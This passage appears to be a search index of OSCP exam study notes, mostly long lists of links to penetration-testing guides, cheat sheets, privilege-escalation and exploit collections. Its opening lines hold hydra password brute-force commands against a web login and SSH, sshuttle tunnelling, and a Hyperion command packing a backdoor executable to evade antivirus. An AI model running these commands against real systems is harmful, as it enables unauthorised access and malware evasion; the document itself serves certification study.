0 . 1 http - post - form \u201c / admin . php : target = auth mode = login user =^ USER ^ password =^ PASS ^ : invalid \u201d - P / usr / share / wordlists / rockyou . txt - l admin hydra - l admin - P / usr / share / wordlists / rockyou . txt - o results . txt ssh : // 10 . 0 . 0 . 1","title":"Password Attacks"},{"location":"certifications/oscp/0-cheatsheet/#tunneling","text":"Tunnels traffic through 10.0.0.1 and makes a route for all traffic destined for 10.10.10.0/24 through your sshuttle tunnel. sshuttle - r root @10.0.0.1 10.10.10.0 / 24 sshuttle - l ( any port ) - r root @10.10.0.1 10.10.0.0 / 24","title":"Tunneling"},{"location":"certifications/oscp/0-cheatsheet/#av-bypassing","text":"root @kali : ~/ Hyperion - 1.0 # wine hyperion . exe .. / backdoor . exe .. / backdoor_mutation . exe https://github.com/furrukhtaj/Enumerator","title":"AV Bypassing"},{"location":"certifications/oscp/0-cheatsheet/#scripts-from-awansec","text":"https://awansec.com/oscp-review.html","title":"Scripts from awansec"},{"location":"certifications/oscp/_collections/","text":"https://book.hacktricks.xyz/ https://bitvijays.github.io/LFC-VulnerableMachines.html https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf ALL DONE : - https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP-Survival-Guide - https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP_Helpful_Links - https://github.com/weaknetlabs/Penetration-Testing-Grimoire - http://configurationsapien.com/2019/07/ - https://github.com/anthemtotheego?tab=repositories - https://github.com/maaaaz/impacket-examples-windows - https://github.com/SecureAuthCorp/impacket/tree/master/examples - https://github.com/Kevin-Robertson?tab=repositories - https://st4rk-sec.com/methodology/ - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70 - https://github.com/gammathc/oscp_material - https://www.toshellandback.com/2015/11/24/ms-priv-esc/ - https://guif.re/windowseop - https://github.com/s0wr0b1ndef/OSCP-note - http://lerned.wikidot.com/decoding - https://github.com/xapax/security/blob/master/privilege_escalation_windows.md - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ - https://github.com/frizb/Windows-Privilege-Escalation - https://herrfeder.github.io/pentesting/2018/09/30/OSCP-Cheat-Sheet.html - https://github.com/Optixal/OSCP-PWK-Notes-Public - http://futureoscp.blogspot.com/2017/10/usefull-oscp-material.html - https://malikashish8.github.io/Walkthrough/notes/ - https://github.com/akenofu/OSCP-Cheat-Sheet - https://github.com/kank3n/pentest - https://pentest.tonyng.net/timo-sablowskis-oscp-note/ - https://github.com/StevenB23/PentesterOps - https://github.com/doffensive/wired-courtyard - https://github.com/mantvydasb/RedTeam-Tactics-and-Techniques - http://www.fuzzysecurity.com/tutorials/16.html - https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md - https://sushant747.gitbooks.io/total-oscp-guide/content/ - https://thashin.gitbooks.io/oscp-pen/content/ - https://d00mfist1.gitbooks.io/ctf/content/ - https://xapax.gitbooks.io/security/content/ - https://github.com/codingo/OSCP-2 - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/ - https://n0w4n.nl/querier/ - https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/ - https://blackwintersecurity.com/tutorials/ - https://github.com/gammathc/oscp_material/tree/master/material - http://www.tecapi.com/public/relative-vulnerability-rating-application.jsp Dropped - https://github.com/garyhooks/oscp","title":" collections"},{"location":"certifications/oscp/_preparation/","text":"Was checking https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://www.peerlyst.com/posts/offensive-security-certified-professional-oscp-study-guide-peerlyst-resources-chiheb-chebbi?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://dann.com.br/oscp-offensive-security-certification-pwk-course-review/ https://guide.offsecnewbie.com/cherrytree-oscp-template https://gist.github.com/natesubra/5117959c660296e12d3ac5df491da395 http://0xc0ffee.io/blog/OSCP-Goldmine Main Exam Guide: https://support.offensive-security.com/oscp-exam-guide/ Exam Day Prep: https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/ Exam requirements (also contains reporting requirements): https://support.offensive-security.com/#!oscp-exam-guide.md PWK support page: https://support.offensive-security.com/#!pwk-support.md https://guide.offsecnewbie.com/ TJNulls_Preparation_Guide: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/ https://backdoorshell.gitbooks.io/oscp-useful-links/ Focused Cheetsheets Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God http://pwnwiki.io https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/ Guides Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/ Sources https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/ Sources with more tips: https://h4ck.co/oscp-journey-exam-lab-prep-tips/ Note to Check https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902 Resources Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop Cheatsheets Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/ Collections windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer Practice Boxes https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery Networking References Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/ Linux References Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/ Python References Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python Enumeration Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/ Buffer Overflow https://github.com/justinsteven/dostackbufferoverflowgood https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html Exploitation https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331 Windows exploitation https://github.com/GuardianRG/awesome-windows-exploitation - https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources Privilege Escalation - linux https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref Basic Linux Privilege Escalation (g0tmi1k) Linux/Unix privileges from a blackhats perspective Automated Unix Privilege Escalation Check (pentestmonkey) Privilege Escalation - Windows https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ Automated Windows Privilege Escalation Check (pentestmonkey) Windows Privilege Escalation \u2013 a cheatsheet (Tim Arneaud) Privilege Escalation - Common MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ Client Side Attacks Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/ Web Attacks SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf Password Attacks https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf Practice Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/ Books Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of Exploitation, 2 nd Edition Shell https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref Payloads Creating Metasploit Payloads: https://netsec.ws/?p=331 Sites OSCP Exam Guide , PentestMonkey , Hash Cracking Sites , Privilege Escalation , Practical OSCP Tips/Tricks , Exploit-DB , Low Priv Enum Linux (g0tmi1k) , Default Credentials (open-sez.me) , RTFM online , 0daysecurity master enumeration , how to use vi (for the brave) , GTFO bins (love these), LOL Bins Corelan Buffer Overflow Exploit Part 1 Buffer Overflow Guide by Stefan Molls File Transfer Guide , SQL Auth Bypass , SQL Injection Cheat Sheet , Metasploit Basics , LFI Cheat Sheet , Cold Fusion Cheat Sheet , All The Things Payloads , Ultimate Windows Priv Esc Methods , NFS Attacks , Michael LaSalvia: Path to the OSCP , Rumkin Cyphers , All the Exploit Papers , and OSCP Practical Tips . Movie : Zero Days Audio Books : Deep Work, The Art of Invisibility, Grit, Spam Nation, Red Team: How to think like the enemy, Ghost in the Wires, The Girl With the Dragon Tattoo, and Mastery.","title":"Was checking"},{"location":"certifications/oscp/_preparation/#was-checking","text":"https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://www.peerlyst.com/posts/offensive-security-certified-professional-oscp-study-guide-peerlyst-resources-chiheb-chebbi?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://dann.com.br/oscp-offensive-security-certification-pwk-course-review/ https://guide.offsecnewbie.com/cherrytree-oscp-template https://gist.github.com/natesubra/5117959c660296e12d3ac5df491da395 http://0xc0ffee.io/blog/OSCP-Goldmine","title":"Was checking"},{"location":"certifications/oscp/_preparation/#main","text":"Exam Guide: https://support.offensive-security.com/oscp-exam-guide/ Exam Day Prep: https://www.vortex.id.au/2017/05/oscp-exam-preparation-exam-day-report-day/ Exam requirements (also contains reporting requirements): https://support.offensive-security.com/#!oscp-exam-guide.md PWK support page: https://support.offensive-security.com/#!pwk-support.md https://guide.offsecnewbie.com/ TJNulls_Preparation_Guide: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://scriptdotsh.com/index.php/2018/04/17/31-days-of-oscp-experience/ https://backdoorshell.gitbooks.io/oscp-useful-links/","title":"Main"},{"location":"certifications/oscp/_preparation/#focused-cheetsheets","text":"Cheatsheets: https://ired.team/ / https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets OSCP-Cheatsheet-God: https://github.com/sumas/OSCP-Cheatsheet-God http://pwnwiki.io https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/","title":"Focused Cheetsheets"},{"location":"certifications/oscp/_preparation/#guides","text":"Module Prep Guide: https://tulpasecurity.files.wordpress.com/2016/09/tulpa-pwk-prep-guide1.pdf A comprehensive guide/material for anyone looking to get into infosec or take the OSCP exam: https://github.com/RustyShackleford221/OSCP-Prep https://localhost.exposed/path-to-oscp/ https://pentesterlab.com/bootcamp https://www.cybrary.it/course/advanced-penetration-testing/ https://danielmiessler.com/study/tcpdump/ https://github.com/moshekaplan/pentesting_notes https://0xdf.gitlab.io/tags.html#oscp https://github.com/areyou1or0/OSCP https://www.xservus.com/pwndefend/hacking-101/","title":"Guides"},{"location":"certifications/oscp/_preparation/#sources","text":"https://jhalon.github.io/OSCP-Review/ https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob https://awansec.com/oscp-review.html https://teckk2.github.io/category/OSCP.html https://webcache.googleusercontent.com/search?q=cache:-QYejCxK0agJ:https://www.netsecfocus.com/oscp/review/2019/01/29/An_Adventure_to_Try_Harder_Tjnulls_OSCP_Journey.html+ cd=1 hl=en ct=clnk gl=lk https://web.archive.org/web/20181212154847/https://github.com/mantvydasb/Offensive-Security-OSCP-Cheatsheets https://areyou1or0.blogspot.com/2019/01/finally-oscp-may-force-be-with-you.html https://jordanpotti.com/oscp/","title":"Sources"},{"location":"certifications/oscp/_preparation/#sources-with-more-tips","text":"https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"Sources with more tips:"},{"location":"certifications/oscp/_preparation/#note-to-check","text":"https://github.com/areyou1or0/OSCP https://github.com/nairuzabulhul/RoadMap https://gist.github.com/cokebottle/3e0916522dc09086ee45e5a93d664f16 https://www.exploit-db.com/papers/12902","title":"Note to Check"},{"location":"certifications/oscp/_preparation/#resources","text":"Pentest Monkey - Post Exploitation Without a TTY: http://pentestmonkey.net/blog/post-exploitation-without-a-tty Phineas Fisher Hacks Catalan Police Union Website: https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s Phineas Fisher - Hackingteam Writeup: http://pastebin.com/raw/0SNSvyjJ Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop","title":"Resources"},{"location":"certifications/oscp/_preparation/#cheatsheets","text":"Transferring Files from Linux to Windows (post-exploitation): https://blog.ropnop.com/transferring-files-from-kali-to-windows/ Linux: Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ Windows post exploration commands: http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf https://github.com/tkal/The-Security-Handbook https://github.com/absolomb/Pentesting/blob/master/guides/LinuxPrivEsc.md http://packetlife.net/library/cheat-sheets/ http://ired.team/offensive-security-experiments/offensive-security-cheetsheets https://github.com/jmfrouin/Offensive-Security-OSCP-Cheatsheets https://www.matteomalvica.com/pentesting/ https://github.com/OlivierLaflamme/Cheatsheet-God VIM: https://vim.rtorr.com/ Netcat: https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf Nmap: https://highon.coffee/blog/nmap-cheat-sheet/ Notepad++: http://www.cheat-sheets.org/saved-copy/Notepad++_Cheat_Sheet.pdf Bash: https://www.isical.ac.in/~pdslab/2016/lectures/bash_cheat_sheet.pdf Reverse Shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Google: https://www.sans.org/security-resources/GoogleCheatSheet.pdf Python: https://www.tunnelsup.com/python-cheat-sheet/ Metasploit: https://www.tunnelsup.com/metasploit-cheat-sheet/","title":"Cheatsheets"},{"location":"certifications/oscp/_preparation/#collections","text":"windows-kernel-exploits Windows: https://github.com/SecWiki/windows-kernel-exploits http://pwnwiki.io/#!privesc/windows/index.md https://github.com/netbiosX/Checklists https://github.com/enaqx/awesome-pentest https://xapax.gitbooks.io/security/content/ NetSec Focus - Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=1556200786 https://chryzsh.gitbooks.io/pentestbook https://github.com/vitalysim/Awesome-Hacking-Resources https://guif.re/ https://github.com/danielmiessler/SecLists https://sqlwiki.netspi.com/?dbms=SQLServer","title":"Collections"},{"location":"certifications/oscp/_preparation/#practice-boxes","text":"https://h4cklife.org/2018/05/22/a-pre-exam-for-future-oscp-students/ https://drive.google.com/open?id=1p0U9yYSObcJty5REN88EQzPeDOFauIn0 https://www.secjuice.com/writeup-lazysysadmin-vulnhub/ https://pentest.join.eset.com/dns-discovery","title":"Practice Boxes"},{"location":"certifications/oscp/_preparation/#networking-references","text":"Networking Basics: TCP, UDP, TCP/IP and OSI Model - https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models Common Ports Protocols - https://pbs.twimg.com/media/DP7axHKUEAALlJB.jpg:large DNS Hacking - http://resources.infosecinstitute.com/dns-hacking/#gref Port Redirection / Tunneling - https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/ http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html http://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html Security+ Section 1: Network Security - https://www.professormesser.com/security-plus/sy0-401/sy0-401-course-index/ Nmap Basics - https://nmap.org/bennieston-tutorial/ Understanding Guide for Nmap Ping Scan (Firewall Bypass): https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/","title":"Networking References"},{"location":"certifications/oscp/_preparation/#linux-references","text":"Learn Linux from the safety of your chair using a remote private linux machine with root access: https://linuxzoo.net/ Linux Journey - https://linuxjourney.com/ OverTheWire - Bandit - http://overthewire.org/wargames/bandit/ Bash Scritping Tutorial - https://linuxconfig.org/bash-scripting-tutorial Null Byte - Linux Basics - https://null-byte.wonderhowto.com/how-to/linux-basics/ Bash for Beginners - http://www.tldp.org/LDP/Bash-Beginners-Guide/html/ Explainshell - http://www.explainshell.com/","title":"Linux References"},{"location":"certifications/oscp/_preparation/#python-references","text":"Codecademy - Python - https://www.codecademy.com/learn/learn-python Python 2.7.14 Documentation - https://docs.python.org/2/index.html Violent Python","title":"Python References"},{"location":"certifications/oscp/_preparation/#enumeration","text":"Enumeration: http://0daysecurity.com/penetration-testing/enumeration.html SMTP - https://pentestlab.blog/2012/11/20/smtp-user-enumeration/ SNMP - http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html http://resources.infosecinstitute.com/what-is-enumeration/#gref https://www.sans.edu/cyber-research/security-laboratory/article/attacks-browsing Recon sript: https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd SMB: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/ Vanquish: https://github.com/frizb/Vanquish Reconnaissance with Recon-Ng, Part 1 (Getting Started): https://null-byte.wonderhowto.com/how-to/hack-like-pro-reconnaissance-with-recon-ng-part-1-getting-started-0169854/","title":"Enumeration"},{"location":"certifications/oscp/_preparation/#buffer-overflow","text":"https://github.com/justinsteven/dostackbufferoverflowgood https://www.sans.org/reading-room/whitepapers/threats/paper/481 https://github.com/justinsteven/dostackbufferoverflowgood https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/ https://exploit-exercises.com/protostar/ http://www.opensecuritytraining.info/IntroX86.html","title":"Buffer Overflow"},{"location":"certifications/oscp/_preparation/#exploitation","text":"https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/ https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Passing the hash with remote Desktop - https://www.kali.org/penetration-testing/passing-hash-remote-desktop/ Spawning a TTY (Interactive) Shell - https://netsec.ws/?p=337 Creating Metasploit Payloads - https://netsec.ws/?p=331","title":"Exploitation"},{"location":"certifications/oscp/_preparation/#windows-exploitation","text":"https://github.com/GuardianRG/awesome-windows-exploitation - https://github.com/GuardianRG/awesome-windows-exploitation/blob/d84ec32638c7362bd21b4f66639ddc9c763e7cc7/README.md https://n0where.net/awesome-windows-exploitation-resources","title":"Windows exploitation"},{"location":"certifications/oscp/_preparation/#privilege-escalation-linux","text":"https://github.com/pentestmonkey/unix-privesc-check Linux: linuxprivchecker.py - http://www.securitysift.com/download/linuxprivchecker.py Linux: LinEnum - https://github.com/rebootuser/LinEnum http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref Basic Linux Privilege Escalation (g0tmi1k) Linux/Unix privileges from a blackhats perspective Automated Unix Privilege Escalation Check (pentestmonkey)","title":"Privilege Escalation - linux"},{"location":"certifications/oscp/_preparation/#privilege-escalation-windows","text":"https://github.com/pentestmonkey/windows-privesc-check Windows Privilege Escalation Methods for Pentesters: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Windows:Elevating privileges by exploiting weak folder permissions - http://www.greyhathacker.net/?p=738 Windows: Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester Using Credentials to Own Windows Boxes - Part 1 (from Kali): https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM): https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/- Windows: Privilege Escalation Fundamentals - http://www.fuzzysecurity.com/tutorials/16.html Practical Windows Privilege Escalation - https://www.youtube.com/watch?v=PC_iMqiuIRQ Automated Windows Privilege Escalation Check (pentestmonkey) Windows Privilege Escalation \u2013 a cheatsheet (Tim Arneaud)","title":"Privilege Escalation - Windows"},{"location":"certifications/oscp/_preparation/#privilege-escalation-common","text":"MySQL Root to System Root with UDF - https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/","title":"Privilege Escalation - Common"},{"location":"certifications/oscp/_preparation/#client-side-attacks","text":"Metasploit Unleashed - https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/","title":"Client Side Attacks"},{"location":"certifications/oscp/_preparation/#web-attacks","text":"SQLI - https://www.exploit-db.com/papers/13045/ OverTheWire: Natas - http://overthewire.org/wargames/natas/ Learning LFI-RFI -1 - https://www.hackersonlineclub.com/lfi-rfi/ Learning LFI-RFI -2 - https://0xzoidberg.wordpress.com/category/security/lfi-rfi/ SQL Injection Cheat-sheet -1 - http://resources.infosecinstitute.com/backdoor-sql-injection/ Local file inclusion - https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf","title":"Web Attacks"},{"location":"certifications/oscp/_preparation/#password-attacks","text":"https://alexandreborgesbrazil.files.wordpress.com/2013/08/introduction_to_password_cracking_part_1.pdf","title":"Password Attacks"},{"location":"certifications/oscp/_preparation/#practice","text":"Root-me.org https://www.rebootuser.com/ https://cmdchallenge.com/ https://vim-adventures.com/ https://lab.pentestit.ru/ https://ctf365.com/ https://pentesterlab.com/bootcamp https://exploit-exercises.com/mainsequence/ http://overthewire.org/wargames/natas/","title":"Practice"},{"location":"certifications/oscp/_preparation/#books","text":"Penetration Testing: A Hands-On Introduction to Hacking The Hacker Playbook 3: Practical Guide To Penetration Testing The Web Application Hacker\u2019s Handbook: Finding and Exploiting Security Flaws Black Hat Python: Python Programming for Hackers and Pentesters Hacking: The Art of 